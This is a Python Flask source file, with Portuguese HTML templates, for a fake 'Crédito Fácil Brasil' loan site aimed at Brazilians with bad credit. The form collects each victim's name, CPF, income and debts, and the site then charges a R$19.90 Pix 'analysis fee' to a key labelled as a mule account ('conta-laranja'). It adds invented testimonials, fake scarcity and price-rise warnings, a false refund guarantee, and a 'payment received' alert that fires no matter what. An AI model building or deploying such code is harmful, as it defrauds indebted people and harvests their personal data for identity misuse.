from flask import Flask, request, session, redirect, url_for, render_template_string
import os
import qrcode
import io
import base64

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ========== CONFIGURAÇÕES (ALTERE) ==========
PIX_KEY = "chave-aleatoria-da-conta-laranja"   # Chave Pix que recebe os R$19,90
MERCHANT_NAME = "Credito Facil Brasil"
MERCHANT_CITY = "SAO PAULO"
TAXA_ANALISE = 19.90         # Valor cobrado pela "análise"
# =============================================

def gerar_crc16(payload):
    crc = 0xFFFF
    for byte in payload.encode("ascii"):
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = (crc << 1) ^ 0x1021
            else:
                crc <<= 1
            crc &= 0xFFFF
    return format(crc, "04X")

def gerar_qr_pix(valor):
    amount_str = str(int(valor)).zfill(2)
    payload = (
        f"00020126360014br.gov.bcb.pix0114{PIX_KEY}"
        f"520400005303986540{amount_str}"
        f"5802BR5922{MERCHANT_NAME}6009{MERCHANT_CITY}62070503***"
    )
    return payload + "6304" + gerar_crc16(payload + "6304")

def qr_para_base64(valor):
    payload = gerar_qr_pix(valor)
    img = qrcode.make(payload)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return base64.b64encode(buf.getvalue()).decode()

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        dados = {
            "nome": request.form.get("nome", ""),
            "cpf": request.form.get("cpf", ""),
            "renda": request.form.get("renda", ""),
            "divida": request.form.get("divida", ""),
        }
        session["dados"] = dados
        return redirect(url_for("checkout"))
    return render_template_string(HTML_INDEX)

@app.route("/checkout")
def checkout():
    qr_b64 = qr_para_base64(TAXA_ANALISE)
    return render_template_string(HTML_CHECKOUT, taxa=TAXA_ANALISE, qr_b64=qr_b64)

@app.route("/confirmar", methods=["POST"])
def confirmar():
    return {"status": "ok"}

# ========== HTMLs ==========

HTML_INDEX = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crédito Fácil Brasil – Mesmo Negativado</title>
    <style>
        :root {
            --gold: #00C853;           /* verde acessível, associado a dinheiro e crédito */
            --gold-light: #2ECC71;
            --bg: #0A0A0A;
            --card: #0D0D0D;
            --text: #FFFFFF;
            --text-dim: #B0B0B0;
            --border: #1A1A1A;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--bg); color: var(--text); line-height: 1.6;
            -webkit-font-smoothing: antialiased;
        }
        .container { max-width: 640px; margin: 0 auto; padding: 40px 20px; }

        .logo { text-align: center; margin-bottom: 32px; }
        .logo .badge {
            display: inline-block; background: rgba(0,200,83,0.15); color: var(--gold);
            padding: 6px 18px; border-radius: 20px; font-size: 0.8rem; letter-spacing: 2px;
            font-weight: 600; margin-bottom: 12px;
        }
        .logo h1 { font-size: 2rem; font-weight: 700; }
        .logo p { color: var(--text-dim); margin-top: 8px; }

        .urgency {
            background: #111; border: 1px solid var(--border); border-radius: 12px;
            padding: 18px 20px; text-align: center; margin-bottom: 30px;
        }
        .urgency .highlight { color: var(--gold); font-weight: 700; }
        .progress-bar { background: #222; border-radius: 8px; height: 5px; margin: 12px 0; }
        .progress-fill { background: var(--gold); height: 100%; width: 79%; border-radius: 8px; }

        .card {
            background: var(--card); border: 1px solid var(--border);
            border-radius: 16px; padding: 30px 24px; margin-bottom: 30px;
        }
        .card h3 { color: var(--gold); margin-bottom: 12px; font-size: 1.3rem; }
        .form-group { margin-bottom: 18px; }
        .form-group label { display: block; margin-bottom: 5px; font-size: 0.9rem; color: #CCC; }
        .form-group input, .form-group select {
            width: 100%; padding: 14px; background: #111; border: 1px solid #2A2A2A;
            border-radius: 10px; color: #FFF; font-size: 1rem;
        }
        .form-group input:focus, .form-group select:focus { border-color: var(--gold); outline: none; }

        .btn-green {
            display: block; width: 100%; padding: 16px; background: linear-gradient(135deg, #00C853, #2ECC71);
            color: #0A0A0A; border: none; border-radius: 10px; font-size: 1.1rem; font-weight: 700;
            cursor: pointer; transition: 0.3s; margin-top: 10px;
        }
        .btn-green:hover { background: linear-gradient(135deg, #1B5E20, #00C853); }

        .testimonials { margin: 30px 0; }
        .testimonial {
            background: var(--card); border: 1px solid var(--border); border-radius: 12px;
            padding: 16px; margin-bottom: 12px;
        }
        .testimonial .name { font-weight: 700; color: var(--gold); }
        .testimonial .story { font-size: 0.9rem; color: #CCC; margin-top: 6px; }

        .footer-note { text-align: center; font-size: 0.8rem; color: #666; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="badge">⚡ CRÉDITO PESSOAL APROVADO NA HORA</div>
            <h1>Crédito Fácil Brasil</h1>
            <p>Mesmo com nome sujo, mesmo com dívida, você pode ser aprovado</p>
        </div>

        <div class="urgency">
            <p>⚠️ <span class="highlight">79% dos liberados hoje</span> já contrataram — apenas 21% restam</p>
            <div class="progress-bar"><div class="progress-fill"></div></div>
            <p style="font-size:0.85rem; color:#AAA;">O valor da análise sobe para <strong>R$ 49,90</strong> quando o limite de análises diárias for atingido</p>
        </div>

        <div class="card">
            <h3>Preencha para ver sua chance</h3>
            <form method="POST">
                <div class="form-group">
                    <label>Nome completo</label>
                    <input type="text" name="nome" required placeholder="Como aparece no documento">
                </div>
                <div class="form-group">
                    <label>CPF</label>
                    <input type="text" name="cpf" required placeholder="000.000.000-00">
                </div>
                <div class="form-group">
                    <label>Renda mensal (aproximada)</label>
                    <select name="renda" required>
                        <option value="">Selecione...</option>
                        <option value="ate1000">Até R$1.000</option>
                        <option value="1000a3000">De R$1.000 a R$3.000</option>
                        <option value="3000a5000">De R$3.000 a R$5.000</option>
                        <option value="acima5000">Acima de R$5.000</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Qual sua maior dívida hoje?</label>
                    <input type="text" name="divida" required placeholder="Ex: cartão, empréstimo, banco X...">
                </div>
                <button type="submit" class="btn-green">Consultar minha chance de aprovação</button>
            </form>
        </div>

        <div class="testimonials">
            <div class="testimonial">
                <div class="name">Juliana S.</div>
                <div class="story">"Negativada há 4 anos. Fiz a análise de R$19,90 e em 2 horas o dinheiro estava na conta. Peguei R$3.500."</div>
            </div>
            <div class="testimonial">
                <div class="name">Roberto F.</div>
                <div class="story">"Achei que era mentira. Mas paguei a taxinha e fui aprovado. Crédito de R$5.000, mesmo com restrição."</div>
            </div>
            <div class="testimonial">
                <div class="name">Ana P.</div>
                <div class="story">"Recuperei meu crédito. A análise é rápida e o Pix do empréstimo cai em minutos."</div>
            </div>
        </div>

        <div class="footer-note">
            Análise sujeita à confirmação de dados. Garantia de devolução da taxa se não aprovado.
        </div>
    </div>
</body>
</html>"""

HTML_CHECKOUT = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Liberar Análise – Crédito Fácil Brasil</title>
    <style>
        :root {
            --gold: #00C853; --gold-light: #2ECC71;
            --bg: #0A0A0A; --card: #0D0D0D; --text: #FFFFFF;
            --text-dim: #A0A0A0; --border: #1A1A1A;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--bg); color: var(--text); text-align: center;
            padding: 40px 20px; -webkit-font-smoothing: antialiased;
        }
        .card {
            background: var(--card); border: 1px solid var(--border);
            border-radius: 16px; padding: 32px 24px; max-width: 450px; margin: 0 auto;
        }
        .logo { margin-bottom: 20px; }
        .logo .badge { color: var(--gold); font-size: 0.8rem; letter-spacing: 2px; }
        .logo h2 { font-size: 1.6rem; font-weight: 700; }
        .preco {
            font-size: 3rem; font-weight: 800; color: var(--gold); margin: 20px 0;
        }
        .preco small { font-size: 1rem; color: #AAA; text-decoration: line-through; display: block; }
        .qr-box {
            background: #FFF; border-radius: 16px; padding: 16px; display: inline-block;
            border: 2px solid var(--gold); margin: 20px 0;
        }
        .qr-box img { width: 200px; height: 200px; }
        .instrucoes { color: #AAA; font-size: 0.9rem; margin: 16px 0; }
        .btn-confirmar {
            background: #25D366; color: #FFF; border: none; padding: 16px; border-radius: 10px;
            font-size: 1.1rem; font-weight: 700; width: 100%; cursor: pointer;
        }
        .garantia { font-size: 0.8rem; color: #666; margin-top: 20px; }
        .garantia strong { color: var(--gold); }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <div class="badge">⚡ ÚLTIMA ETAPA</div>
            <h2>Libere sua Análise de Crédito</h2>
        </div>
        <p style="color:#CCC;">Seus dados já estão sendo pré‑avaliados. Para receber a resposta definitiva, pague a taxa de análise:</p>
        <div class="preco">
            <small>R$ 49,90</small> R$ {{ taxa }}
        </div>
        <p style="font-size:0.9rem; color:#CCC;">Pagamento único — sem surpresas</p>
        <div class="qr-box">
            <img src="data:image/png;base64,{{ qr_b64 }}" alt="QR Code Pix">
        </div>
        <p class="instrucoes">Abra o app do seu banco e escaneie o código</p>
        <button class="btn-confirmar" onclick="confirmar()">Já paguei — quero meu crédito</button>
        <div class="garantia">
            <p><strong>Garantia:</strong> se seu crédito não for aprovado, devolvemos os R$ {{ taxa }} em até 24h.</p>
        </div>
    </div>
    <script>
        function confirmar() {
            alert("✅ Pagamento recebido! Em instantes você receberá uma mensagem no WhatsApp com sua aprovação.");
            fetch("/confirmar", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({status:"pago"})});
        }
    </script>
</body>
</html>"""

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
